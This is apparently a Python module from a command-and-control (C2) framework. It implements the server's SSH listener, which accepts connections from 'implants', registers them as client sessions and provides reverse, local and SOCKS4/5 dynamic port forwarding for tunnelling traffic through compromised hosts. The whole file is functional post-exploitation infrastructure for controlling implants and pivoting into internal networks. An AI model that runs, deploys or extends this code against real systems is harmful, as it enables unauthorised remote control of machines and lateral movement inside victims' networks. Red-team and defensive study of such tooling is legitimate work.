import paramiko
import socket
import logging
import threading
import os
import select
import struct
from typing import Tuple, Callable, Dict, Any, Optional

from ..session.client_session import ClientSession
from .base_server import BaseServer

logger = logging.getLogger('c2.ssh')

class SSHForwardingHandler:
    """Handles forwarding functionality for SSH connections"""
    
    def __init__(self, transport: Optional[paramiko.Transport] = None):
        self.transport = transport
        self.forwarded_ports = {}  # (addr, port) -> (socket, thread_event)
        self.dynamic_forwards = {}  # port -> (socket, thread_event)
        self.direct_tcpip_threads = {}  # channel_id -> thread_event
    
    def set_transport(self, transport: paramiko.Transport):
        """Store transport to open forwarded channels"""
        self.transport = transport
    
    def check_port_forward_request(self, addr: str, port: int):
        """Handle remote (reverse) port forwarding requests"""
        logger.info(f"Port forward request from implant: {addr}:{port}")
        
        # Check if this port is already forwarded
        if (addr, port) in self.forwarded_ports:
            logger.warning(f"Port {addr}:{port} is already forwarded, canceling previous forward")
            self.cancel_port_forward_request(addr, port)
            # Allow some time for the socket to close properly
            import time
            time.sleep(0.5)
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((addr, port))
            sock.listen(5)
            
            # Create an event to signal thread termination
            stop_event = threading.Event()
            
            # Store both socket and event
            self.forwarded_ports[(addr, port)] = (sock, stop_event)
            
            # Start handler thread
            forward_thread = threading.Thread(
                target=self._forward_handler, 
                args=(sock, addr, port, stop_event), 
                daemon=True
            )
            forward_thread.start()
            
            return port
        except Exception as e:
            logger.error(f"Failed to bind forwarded port {addr}:{port}: {e}")
            return False
    
    def check_dynamic_port_forward_request(self, addr: str, port: int) -> bool:
        """
        Allow the client to ask the server to listen on (addr,port) for a SOCKS proxy.
        Paramiko will then invoke _dynamic_forward_handler for you.
        """
        logger.info(f"Dynamic port forward request from implant: {addr}:{port}")
        # bind and listen just like check_port_forward_request
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((addr, port))
        sock.listen(5)
        stop_event = threading.Event()
        self.dynamic_forwards[port] = (sock, stop_event)
        threading.Thread(
            target=self._dynamic_forward_handler,
            args=(sock, port, stop_event),
            daemon=True
        ).start()
        return True
    
    def cancel_port_forward_request(self, addr: str, port: int):
        """Cancel a forwarded port and clean up resources"""
        logger.info(f"Canceling port forward for {addr}:{port}")
        
        if (addr, port) not in self.forwarded_ports:
            logger.warning(f"No forwarding found for {addr}:{port}")
            return
            
        sock, stop_event = self.forwarded_ports.pop((addr, port))
        
        # Signal the thread to stop
        stop_event.set()
        
        # Close the socket to unblock accept()
        try:
            sock.close()
            logger.info(f"Closed forwarded port {addr}:{port}")
        except Exception as e:
            logger.error(f"Error closing forwarded port: {e}")
    
    def cancel_dynamic_port_forward_request(self, port: int):
        """Cancel a dynamic forwarded port and clean up resources"""
        logger.info(f"Canceling dynamic port forward for port {port}")
        
        if port not in self.dynamic_forwards:
            logger.warning(f"No dynamic forwarding found for port {port}")
            return
            
        sock, stop_event = self.dynamic_forwards.pop(port)
        
        # Signal the thread to stop
        stop_event.set()
        
        # Close the socket to unblock accept()
        try:
            sock.close()
            logger.info(f"Closed dynamic forwarded port {port}")
        except Exception as e:
            logger.error(f"Error closing dynamic forwarded port: {e}")
    
    def _forward_handler(self, sock: socket.socket, addr: str, port: int, stop_event: threading.Event):
        """Accept connections on forwarded port and open channel back to client"""
        logger.info(f"Forward handler started for {addr}:{port}")
        
        # Set socket timeout to allow checking stop_event periodically
        sock.settimeout(1.0)
        
        while not stop_event.is_set():
            try:
                client_sock, client_addr = sock.accept()
                logger.debug(f"Accepted connection from {client_addr} on forwarded port {port}")
                
                if self.transport is None or not self.transport.is_active():
                    logger.warning("Transport not available for forwarded connection")
                    client_sock.close()
                    continue
                    
                channel = self.transport.open_forwarded_tcpip_channel((addr, port), client_addr)
                if channel is None:
                    logger.warning("Failed to open forwarded channel")
                    client_sock.close()
                    continue
                    
                threading.Thread(
                    target=self._tunnel_data, 
                    args=(client_sock, channel, stop_event), 
                    daemon=True
                ).start()
                
            except socket.timeout:
                # This is expected due to the timeout we set
                continue
            except OSError as e:
                if stop_event.is_set():
                    # This is an expected error when closing the socket
                    logger.debug(f"Socket closed for {addr}:{port}")
                else:
                    logger.error(f"Unexpected socket error in forward handler: {e}")
                break
            except Exception as e:
                logger.error(f"Error in forward handler {addr}:{port}: {e}")
                break
                
        logger.info(f"Forward handler stopped for {addr}:{port}")
    
    def _dynamic_forward_handler(self, sock: socket.socket, port: int, stop_event: threading.Event):
        """
        Accept incoming SOCKS connections on the server-side port,
        perform the SOCKS handshake, then open a *forwarded-tcpip* channel
        back to the client for each CONNECT request.
        """
        sock.settimeout(1.0)
        while not stop_event.is_set():
            try:
                client_sock, client_addr = sock.accept()
                threading.Thread(
                    target=self._handle_socks_connection,
                    args=(client_sock, client_addr, stop_event),
                    daemon=True
                ).start()
            except socket.timeout:
                continue
            except Exception as e:
                if not stop_event.is_set():
                    logger.error(f"Error in dynamic forward handler: {e}")
                break
    
    def _handle_socks_connection(self, client_sock: socket.socket, client_addr: Tuple[str, int], stop_event: threading.Event):
        """Handle SOCKS protocol and establish dynamic forwarding"""
        try:
            # Read SOCKS version
            version = client_sock.recv(1)
            if not version:
                logger.warning("Client disconnected before sending SOCKS version")
                client_sock.close()
                return
                
            if version[0] == 5:  # SOCKS5
                self._handle_socks5(client_sock, client_addr, stop_event)
            elif version[0] == 4:  # SOCKS4
                self._handle_socks4(client_sock, client_addr, stop_event)
            else:
                logger.warning(f"Unsupported SOCKS version: {version[0]}")
                client_sock.close()
        except Exception as e:
            logger.error(f"Error handling SOCKS connection: {e}")
            client_sock.close()
    
    def _handle_socks5(self, client_sock: socket.socket, client_addr: Tuple[str,int], stop_event: threading.Event):
        """
        Handle a SOCKS5 CONNECT request on the server side, then open a
        forwarded-tcpip channel back to the implant for the requested dst.
        """
        try:
            # 1) Greeting: VER, NMETHODS
            header = client_sock.recv(2)
            if len(header) < 2 or header[0] != 0x05:
                client_sock.close()
                return
            nmethods = header[1]
            methods = client_sock.recv(nmethods)

            # 2) Select "no authentication" (0x00)
            client_sock.sendall(b'\x05\x00')

            # 3) Request: VER, CMD, RSV, ATYP
            req = client_sock.recv(4)
            if len(req) < 4:
                client_sock.close()
                return
            ver, cmd, rsv, atyp = req
            if ver != 0x05 or cmd != 0x01:   # only CONNECT supported
                client_sock.sendall(b'\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00')
                client_sock.close()
                return

            # 4) Read DST.ADDR
            if atyp == 0x01:           # IPv4
                addr_bytes = client_sock.recv(4)
                dst_addr = socket.inet_ntoa(addr_bytes)
            elif atyp == 0x03:         # domain name
                length = client_sock.recv(1)[0]
                addr_bytes = client_sock.recv(length)
                dst_addr = addr_bytes.decode('ascii')
            elif atyp == 0x04:         # IPv6
                addr_bytes = client_sock.recv(16)
                dst_addr = socket.inet_ntop(socket.AF_INET6, addr_bytes)
            else:
                client_sock.sendall(b'\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00')
                client_sock.close()
                return

            # 5) Read DST.PORT
            port_bytes = client_sock.recv(2)
            dst_port = struct.unpack('!H', port_bytes)[0]

            logger.info(f"SOCKS5 CONNECT request for {dst_addr}:{dst_port}")

            # 6) Open a forwarded-tcpip channel back to the implant
            channel = self.transport.open_forwarded_tcpip_channel(
                (dst_addr, dst_port),
                client_addr
            )
            if channel is None:
                # host unreachable
                client_sock.sendall(b'\x05\x04\x00\x01\x00\x00\x00\x00\x00\x00')
                client_sock.close()
                return

            # 7) Send success reply: VER, REP=0, RSV, ATYP, BND.ADDR, BND.PORT
            #    We echo the DST as our BND
            reply = b'\x05\x00\x00'
            if atyp == 0x01:
                reply += b'\x01' + addr_bytes + port_bytes
            elif atyp == 0x03:
                reply += b'\x03' + bytes([len(addr_bytes)]) + addr_bytes + port_bytes
            else:
                reply += b'\x04' + addr_bytes + port_bytes
            client_sock.sendall(reply)

            # 8) Tunnel data between client_sock and the SSH channel
            self._tunnel_data(client_sock, channel, stop_event)

        except Exception as e:
            logger.error(f"Error in SOCKS5 handler: {e}")
            try:
                client_sock.close()
            except:
                pass
    
    def _handle_socks4(self, client_sock: socket.socket, client_addr: Tuple[str, int], stop_event: threading.Event):
        """Handle SOCKS4/4a protocol"""
        try:
            # Already read the version byte, now read command
            cmd = client_sock.recv(1)[0]
            
            if cmd != 1:  # Only support CONNECT command
                logger.warning(f"Unsupported SOCKS4 command: {cmd}")
                client_sock.sendall(b'\x00\x5b\x00\x00\x00\x00\x00\x00')  # Request rejected
                client_sock.close()
                return
            
            # Get destination port
            dst_port = struct.unpack('!H', client_sock.recv(2))[0]
            
            # Get IPv4 address
            addr_bytes = client_sock.recv(4)
            dst_addr = None
            
            # Check if it's SOCKS4A (if first 3 bytes are 0,0,0,x where x is non-zero)
            if addr_bytes[0] == 0 and addr_bytes[1] == 0 and addr_bytes[2] == 0 and addr_bytes[3] != 0:
                # SOCKS4A - domain name follows
                # Skip user ID
                while client_sock.recv(1) != b'\x00':
                    pass
                
                # Read domain name
                domain = b''
                while True:
                    c = client_sock.recv(1)
                    if c == b'\x00':
                        break
                    domain += c
                dst_addr = domain.decode('utf-8')
            else:
                # Regular SOCKS4
                dst_addr = socket.inet_ntoa(addr_bytes)
                
                # Skip user ID
                while client_sock.recv(1) != b'\x00':
                    pass
            
            logger.info(f"SOCKS4 request to connect to {dst_addr}:{dst_port}")
            
            # Open direct-tcpip channel to target through the SSH connection
            try:
                channel = self.transport.open_channel('direct-tcpip', 
                                                   (dst_addr, dst_port), 
                                                   client_addr)
                
                # Send success response
                client_sock.sendall(b'\x00\x5a\x00\x00\x00\x00\x00\x00')
                
                # Start bi-directional tunneling
                self._tunnel_data(client_sock, channel, stop_event)
                
            except Exception as e:
                logger.error(f"Failed to connect to destination: {e}")
                client_sock.sendall(b'\x00\x5b\x00\x00\x00\x00\x00\x00')  # Request rejected
                client_sock.close()
                
        except Exception as e:
            logger.error(f"Error in SOCKS4 handler: {e}")
            client_sock.close()
    
    def _tunnel_data(self, sock: socket.socket, channel: paramiko.Channel, stop_event: threading.Event):
        """Bi-directional tunnel between socket and SSH channel"""
        try:
            sock.setblocking(False)
            channel.setblocking(False)
            
            while not stop_event.is_set() and channel.active:
                r, w, x = select.select([sock, channel], [], [], 0.5)
                if sock in r:
                    data = sock.recv(4096)
                    if not data:
                        break
                    channel.send(data)
                if channel in r:
                    data = channel.recv(4096)
                    if not data:
                        break
                    sock.send(data)
        except Exception as e:
            logger.error(f"Error in tunnel: {e}")
        finally:
            try:
                sock.close()
            except:
                pass
            try:
                channel.close()
            except:
                pass
            
    def handle_direct_tcpip_request(self, chanid: int, origin: Tuple[str, int], destination: Tuple[str, int]) -> int:
        """
        Allow the client's direct‑tcpip (local‑ or dynamic‑forward) channels.
        This is for local port forwarding from client to server.
        """
        src_addr, src_port = origin
        dst_addr, dst_port = destination
        
        logger.info(f"Direct‑tcpip channel {chanid} requested: {src_addr}:{src_port} -> {dst_addr}:{dst_port}")
        
        # Create a stop event for this direct-tcpip channel
        stop_event = threading.Event()
        self.direct_tcpip_threads[chanid] = stop_event
        
        # Get the channel once it's created
        def get_channel():
            channel = None
            for _ in range(10):  # Try a few times with a short delay
                if not self.transport:
                    return None
                channel = self.transport.accept(timeout=1.0)
                if channel and channel.get_id() == chanid:
                    return channel
            return None
        
        # Start a new thread to handle this forwarding request
        threading.Thread(
            target=self._handle_direct_tcpip,
            args=(chanid, dst_addr, dst_port, get_channel, stop_event),
            daemon=True
        ).start()
        
        return paramiko.OPEN_SUCCEEDED
    
    def _handle_direct_tcpip(self, chanid: int, dst_addr: str, dst_port: int, 
                            get_channel_func: Callable, stop_event: threading.Event):
        """Handle local port forwarding (direct-tcpip) requests"""
        try:
            # Get the channel for this direct-tcpip request
            channel = get_channel_func()
            if not channel:
                logger.error(f"Failed to get channel for direct-tcpip {chanid}")
                return
            
            logger.info(f"Got channel {channel.get_id()} for direct-tcpip request to {dst_addr}:{dst_port}")
            
            # Connect to the destination
            dest_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                dest_sock.connect((dst_addr, dst_port))
                logger.info(f"Connected to destination {dst_addr}:{dst_port} for direct-tcpip forwarding")
                
                # Now tunnel data between the channel and destination socket
                self._tunnel_data(dest_sock, channel, stop_event)
                
            except Exception as e:
                logger.error(f"Failed to connect to {dst_addr}:{dst_port}: {e}")
                channel.close()
                dest_sock.close()
                
        except Exception as e:
            logger.error(f"Error handling direct-tcpip channel {chanid}: {e}")
        finally:
            # Clean up
            if chanid in self.direct_tcpip_threads:
                del self.direct_tcpip_threads[chanid]


class SSHServerInterface(paramiko.ServerInterface):
    """SSH Server Interface implementation with port forwarding support"""

    def __init__(self, config: dict):
        super().__init__()
        self.config = config
        self.pty_enabled = False
        self.term_settings = None
        self.event = threading.Event()
        self.is_sftp_connection = False
        self.transport = None
        self.forwarding_handler = SSHForwardingHandler()

    def set_transport(self, transport: paramiko.Transport):
        """Store transport to open forwarded channels"""
        self.transport = transport
        self.forwarding_handler.set_transport(transport)

    def check_channel_request(self, kind: str, chanid: int) -> int:
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        if kind == 'forwarded-tcpip':
            return paramiko.OPEN_SUCCEEDED
        if kind == 'direct-tcpip':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_port_forward_request(self, addr: str, port: int):
        """Handle remote (reverse) port forwarding requests"""
        return self.forwarding_handler.check_port_forward_request(addr, port)

    def check_dynamic_port_forward_request(self, addr: str, port: int) -> bool:
        """Handle dynamic port forwarding requests (SOCKS proxy)"""
        return self.forwarding_handler.check_dynamic_port_forward_request(addr, port)

    def cancel_port_forward_request(self, addr: str, port: int):
        """Cancel a forwarded port and clean up resources"""
        self.forwarding_handler.cancel_port_forward_request(addr, port)

    def check_channel_pty_request(self, channel, term, width, height, width_pixels, height_pixels, modes):
        self.pty_enabled = True
        self.term_settings = {
            'term': term,
            'width': width,
            'height': height,
            'width_pixels': width_pixels,
            'height_pixels': height_pixels,
            'modes': modes
        }
        logger.info(f"PTY requested: {term} ({width}x{height})")
        return True
    
    def check_channel_direct_tcpip_request(self, chanid: int,
                                           origin: Tuple[str, int],
                                           destination: Tuple[str, int]) -> int:
        """Handle direct-tcpip requests (local port forwarding)"""
        return self.forwarding_handler.handle_direct_tcpip_request(chanid, origin, destination)

    def check_channel_shell_request(self, channel):
        logger.info("Shell request accepted")
        return True

    def check_channel_subsystem_request(self, channel: paramiko.Channel, name: str) -> bool:
        if name == 'sftp':
            self.is_sftp_connection = True
            logger.info("SFTP subsystem request accepted")
            return True
        return False

    def check_auth_password(self, username: str, password: str) -> int:
        """Authenticate user with username and password"""
        if username == self.config['username'] and password == self.config['password']:
            return paramiko.AUTH_SUCCESSFUL
        logger.warning(f"Authentication failed for user: {username}")
        return paramiko.AUTH_FAILED

    def get_allowed_auths(self, username: str) -> str:
        return 'password'


class SSHServer(BaseServer):
    """SSH transport implementation for C2 server"""

    def __init__(self, config: dict, client_connected_callback: Callable = None):
        super().__init__(config, client_connected_callback)
        self.server_socket = None
        self.host_key = None
        self._load_host_key()

    def _load_host_key(self):
        """Load or generate SSH host key"""
        key_path = self.config['host_key']
        try:
            if not os.path.exists(key_path):
                key = paramiko.RSAKey.generate(2048)
                key.write_private_key_file(key_path)
                self.host_key = key
            else:
                self.host_key = paramiko.RSAKey(filename=key_path)
            logger.info(f"Loaded host key from {key_path}")
        except Exception as e:
            logger.error(f"Failed to load host key: {e}")
            raise

    def start(self):
        """Start the SSH server"""
        if self.running:
            logger.warning("SSH server already running")
            return
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.config['bind_address'], self.config['ssh_port']))
            self.server_socket.listen(5)
            self.running = True
            logger.info(f"SSH server listening on {self.config['bind_address']}:{self.config['ssh_port']}")
            threading.Thread(target=self._accept_connections, daemon=True).start()
        except Exception as e:
            logger.error(f"Failed to start SSH server: {e}")
            if self.server_socket:
                self.server_socket.close()
            raise

    def stop(self):
        """Stop the SSH server"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
            self.server_socket = None
        logger.info("SSH server stopped")

    def _accept_connections(self):
        """Accept incoming SSH connections"""
        while self.running:
            try:
                client_socket, addr = self.server_socket.accept()
                threading.Thread(target=self._handle_connection, args=(client_socket, addr), daemon=True).start()
            except OSError:
                break
            except Exception as e:
                logger.error(f"Error in accept loop: {e}")

    def _handle_connection(self, client_socket: socket.socket, addr: Tuple[str, int]):
        """Handle a new SSH connection"""
        logger.info(f"New SSH connection from {addr[0]}:{addr[1]}")
        try:
            transport = paramiko.Transport(client_socket)
            transport.add_server_key(self.host_key)

            server_interface = SSHServerInterface(self.config)
            transport.start_server(server=server_interface)
            server_interface.set_transport(transport)

            channel = transport.accept(20)
            if channel is None:
                logger.error(f"No channel established from {addr}")
                return

            if server_interface.is_sftp_connection or addr[0] == '127.0.0.1':
                logger.debug("SFTP connection - skipping client session registration")
                return

            if server_interface.pty_enabled and server_interface.term_settings:
                channel.get_pty(**server_interface.term_settings)
                channel.invoke_shell()

            client_info = channel.recv(1024).decode(errors='replace')
            logger.info(f"Client info received: {client_info.strip()}")

            client = ClientSession(
                channel=channel,
                client_info=client_info,
                addr=addr,
                config=self.config,
                transport_type='ssh',
                pty_enabled=server_interface.pty_enabled,
                term_settings=server_interface.term_settings
            )
            self.add_client(client)
            channel.send(' ')
        except Exception as e:
            logger.error(f"Error handling connection: {e}")